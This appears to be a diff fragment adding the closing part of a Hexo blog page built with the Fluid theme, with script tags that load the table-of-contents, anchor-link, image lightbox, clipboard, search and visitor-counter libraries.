+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
